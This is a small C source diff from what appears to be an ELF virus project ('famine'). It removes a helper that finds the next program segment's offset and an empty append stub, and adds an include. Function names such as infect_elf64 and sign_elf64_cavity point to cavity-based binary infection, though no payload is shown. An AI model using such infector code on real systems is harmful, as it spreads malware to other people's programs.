@@ -1,25 +1,8 @@
 #include "famine.h"
 
 #include <limits.h> // UINT64_MAX
+#include <stdint.h> // uintX_t
 #include <string.h> // memcpy()
-
-uint64_t elf64_find_next_segment(Elf64_Phdr *phdr, uint32_t phnum, uint32_t index)
-{
-	uint64_t curr, next, tmp;
-
-	curr = phdr[index].p_offset;
-	next = UINT64_MAX;
-
-	for (uint32_t i = 0; i < phnum; i++) {
-		if (i == index)
-			continue ;
-
-		tmp = phdr[i].p_offset;
-		if (tmp > curr && tmp < next)
-			next = tmp;
-	}
-	return (next);
-}
 
 int sign_elf64_cavity(t_file *file, t_elf64 *elf64)
 {
@@ -48,11 +31,6 @@ int sign_elf64_cavity(t_file *file, t_elf64 *elf64)
 	}
 	return (1);
 }
-
-// int sign_elf64_append(t_file *file, t_elf64 *elf64)
-// {
-
-// }
 
 void infect_elf64(t_file *file, t_elf64 *elf64)
 {
